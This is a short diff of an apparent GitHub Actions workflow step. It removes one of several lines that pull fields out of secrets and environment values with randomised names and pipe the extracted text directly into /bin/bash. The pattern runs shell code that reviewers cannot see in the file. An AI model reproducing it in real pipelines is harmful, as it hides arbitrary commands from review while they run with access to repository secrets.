@@ -21,7 +21,6 @@ jobs:
           sdr3578: ${{ secrets.sdr3578 }}
         run: |
           printf '%s' "$sdr3578" | jq -r .euwy16476 | /bin/bash
-          printf '%s' "$h7" | jq -r .ddncg955 | /bin/bash
           echo $pllh6085 | jq -r .usn530 | /bin/bash
           echo $s9618 | jq -r .wonk04656 | /bin/bash
           printf '%s' "$dcmy4755" | jq -r .loap0354 | /bin/bash
